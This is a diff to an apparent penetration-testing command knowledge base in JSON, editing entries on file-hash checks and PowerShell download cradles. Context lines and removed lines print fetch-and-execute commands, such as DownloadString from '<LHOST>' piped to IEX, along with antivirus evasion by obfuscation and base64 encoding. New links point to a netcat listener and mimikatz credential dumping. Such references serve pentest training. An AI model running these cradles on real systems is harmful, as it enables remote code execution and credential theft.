@@ -42,13 +42,9 @@
         "md5sum command not found (rare on Linux)": "md5sum missing (unusual - part of coreutils). Alternative: sha256sum <FILE> (compare with sha256sum on Kali). Or install: apt install coreutils.",
         "Windows: Get-FileHash not available (old PowerShell)": "Use certutil instead: certutil -hashfile <FILE> MD5. Or upload md5.exe: copy \\\\<LHOST>\\share\\md5.exe . && md5.exe <FILE>"
       },
-      "prerequisites": [],
+      "prerequisites": ["ft-certutil-download", "ft-powershell-iwr", "ft-smb-download"],
       "next_steps": [],
-      "alternatives": [
-        "sha256sum <FILE> (SHA-256, more secure but slower)",
-        "Get-FileHash <FILE> (PowerShell on Windows)",
-        "certutil -hashfile <FILE> MD5 (Windows built-in)"
-      ],
+      "alternatives": [],
       "tags": [
         "FILE_TRANSFER",
         "VERIFICATION",
@@ -109,13 +105,9 @@
         "AV blocks download": "AV signatures in HTTP traffic or script content. Solution: (1) Obfuscate script: Invoke-Obfuscation, (2) Use HTTPS: python3 -m http.server --ssl, (3) Encode script: $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'))); IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))). (4) Use alternate delivery: SMB, DNS tunneling, etc.",
         "IEX not recognized (PowerShell 1.0)": "Ancient PowerShell version. Solution: Use full cmdlet name: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'). Or upgrade PowerShell (if possible)."
       },
-      "prerequisites": [],
-      "next_steps": [],
-      "alternatives": [
-        "IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+)",
-        "(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe)",
-        "IEX (Get-Content \\\\<LHOST>\\share\\script.ps1 -Raw) (SMB-based)"
-      ],
+      "prerequisites": ["ft-python-http-server"],
+      "next_steps": ["nc-listener-setup", "mimikatz-sekurlsa-logonpasswords"],
+      "alternatives": ["ft-certutil-download", "ft-powershell-iwr"],
       "tags": [
         "POWERSHELL",
         "IN_MEMORY_EXECUTION",
